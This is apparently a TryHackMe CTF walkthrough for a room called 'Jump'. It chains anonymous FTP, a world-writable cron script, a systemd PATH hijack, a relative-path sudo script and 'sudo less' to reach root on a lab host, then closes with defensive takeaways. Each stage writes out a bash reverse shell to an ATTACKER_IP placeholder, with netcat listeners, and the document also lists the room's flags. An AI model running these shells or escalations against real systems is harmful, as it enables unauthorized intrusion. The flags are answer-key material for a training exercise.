# TryHackMe: Jump — Walkthrough

**Room type:** CTF / Lateral Movement  
**Category:** Linux Privilege Escalation / Pipeline Abuse  
**Tools:** nmap, ftp, netcat  

---

## Overview

Jump is a five-stage lateral movement chain across a misconfigured Linux automation pipeline. Each stage abuses a trust relationship the previous user has with the next — a world-writable FTP drop zone, a world-writable cron script, a PATH hijack via a systemd service, a world-writable deploy helper, and a `less` sudo misconfiguration. The name fits: five consecutive jumps, each made possible by whoever set up the previous stage being too trusting of the next.

Initial access is anonymous FTP. From there the chain runs:

`anonymous FTP → recon_user → dev_user → monitor_user → ops_user → root`

---

## Reconnaissance

```bash
nmap -sV -p- --min-rate 5000 10.146.142.131
```

Two ports: 21 (FTP) and 22 (SSH). No web service, no other attack surface. Anonymous FTP is the entry point.

---

## Stage 0 — Anonymous FTP → recon_user

Connect anonymously:

```bash
ftp anonymous@10.146.142.131
```

The FTP root has two directories: `incoming/` (world-writable) and `pub/`. Reading `pub/README.txt`:

```
[ recon pipeline ]
All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

The pipeline auto-executes anything dropped in `incoming/`. Write a reverse shell and upload it:

```bash
echo '#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' > /tmp/job

# Listener
nc -lvnp 4444

# Upload
ftp anonymous@10.146.142.131
cd incoming
put /tmp/job job
```

Within a minute the pipeline executes the script and a shell arrives as `recon_user`.

**Flag 1: `THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}`**

---

## Stage 1 — recon_user → dev_user

Enumerate what's accessible by dev_user:

```bash
find / -user dev_user -readable 2>/dev/null
```

Key finding: `/opt/dev/backup.sh` is owned by `dev_user` but world-writable (`-rwxrwxr-x`). Contents:

```bash
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
```

This backs up recon_user's home — almost certainly run by dev_user on a cron schedule. Overwrite it:

```bash
echo '#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4445 0>&1' > /opt/dev/backup.sh
```

Set up a listener on port 4445 and wait for the cron to fire.

**Flag 2: `THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}`**

---

## Stage 2 — dev_user → monitor_user

Check what monitor_user runs:

```bash
find / -user monitor_user -perm -u+x 2>/dev/null | grep -v proc
# /usr/local/bin/healthcheck
```

Inspect the systemd service:

```bash
cat /etc/systemd/system/healthcheck.service
```

```ini
[Service]
Type=simple
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

The healthcheck runs as `monitor_user` in a loop calling `ps`:

```bash
#!/bin/bash
while true; do
  ps aux | grep -v grep
  sleep 5
done
```

`PATH` puts `/opt/dev/bin` first — a directory owned by `dev_user`. A fake `ps` file already exists there. Overwrite it:

```bash
echo '#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4446 0>&1' > /opt/dev/bin/ps
chmod +x /opt/dev/bin/ps
```

Within 5 seconds the healthcheck loop calls `ps`, resolves it to our fake binary via the PATH, and executes it as `monitor_user`.

**Flag 3: `THM{c1e9a7b3-2d44-4a88-9f7e-3b6c2d5a9f77}`**

---

## Stage 3 — monitor_user → ops_user

Check sudo permissions:

```bash
sudo -l
# (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

Inspect the script:

```bash
cat /usr/local/bin/deploy.sh
```

```bash
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

It `cd`s to `/opt/app` and calls `./deploy_helper.sh` using a relative path. Check ownership:

```bash
ls -la /opt/app/deploy_helper.sh
# -rwxr-xr-x 1 monitor_user monitor_user 90 Feb 2 2026 /opt/app/deploy_helper.sh
```

`monitor_user` owns the helper. Overwrite it, then trigger the sudo call:

```bash
cat > /opt/app/deploy_helper.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4447 0>&1
EOF
chmod +x /opt/app/deploy_helper.sh

sudo -u ops_user /usr/local/bin/deploy.sh
```

Note: `sudo` requires a TTY when `use_pty` is set. If the shell balks, upgrade first with `script -c /bin/bash /dev/null`, then rerun the sudo command.

**Flag 4: `THM{f7a2c9d1-6e33-4b55-8d11-9c0a7b2e4d88}`**

---

## Stage 4 — ops_user → root

Check sudo permissions:

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/less
```

`less` with sudo and `env_keep+=LESS` is a textbook GTFOBins escalation. Without a full TTY, the simplest approach is reading root files directly:

```bash
sudo /usr/bin/less /root/flag.txt
```

For a full root shell (with a proper TTY), open any file with `sudo less` and type `!/bin/bash` at the prompt.

**Flag 5: `THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}`**

---

## Full Chain Summary

| Jump | From | To | Vector |
|------|------|----|--------|
| 0 | Anonymous FTP | recon_user | World-writable `incoming/` auto-executes uploaded scripts |
| 1 | recon_user | dev_user | World-writable cron script `/opt/dev/backup.sh` run by dev_user |
| 2 | dev_user | monitor_user | PATH hijack — `/opt/dev/bin` (dev_user-owned) first in healthcheck service PATH |
| 3 | monitor_user | ops_user | Sudo runs `deploy.sh` which calls relative `./deploy_helper.sh` owned by monitor_user |
| 4 | ops_user | root | `sudo less` reads arbitrary files as root |

---

## Key Takeaways

**World-writable scripts in automation pipelines are an immediate privilege escalation primitive.** Both `/incoming/` and `/opt/dev/backup.sh` could be overwritten by a lower-privileged user. Any script that runs automatically and can be modified by an attacker is a lateral movement vector — the scheduler doesn't care who wrote the file last.

**PATH order in service environments is a critical attack surface.** The healthcheck systemd unit explicitly set `PATH=/opt/dev/bin:/usr/local/bin:/usr/bin`, placing a dev_user-controlled directory first. Every command the service called resolved against attacker-controlled binaries before system binaries. Systemd units should use absolute paths for every command, not rely on PATH resolution.

**Relative paths in sudo-allowed scripts break privilege boundaries.** `deploy.sh` used `./deploy_helper.sh` rather than an absolute path. Because the script `cd`d into `/opt/app` first, the relative call resolved to a file owned by the calling user — entirely defeating the intent of the sudo rule. Sudo rules should specify the full absolute path of every binary that will run, or they create an exploitable gap.

**`less` as a sudo binary is a trivial read-anything escalation.** Without a TTY, `sudo less /root/flag.txt` reads the flag directly. With a TTY, `!/bin/bash` at the less prompt drops a root shell. Any interactive pager with sudo is effectively equivalent to `sudo cat` plus a shell spawn.

**TTY issues in reverse shells interact badly with `use_pty`.** The `use_pty` sudo option (set in `/etc/sudoers`) requires a proper terminal before it will run. Several stages needed the shell upgraded with `script -c /bin/bash /dev/null` before sudo would cooperate. This is a common friction point in CTF reverse shells — getting a clean PTY is often a prerequisite for the intended escalation path.
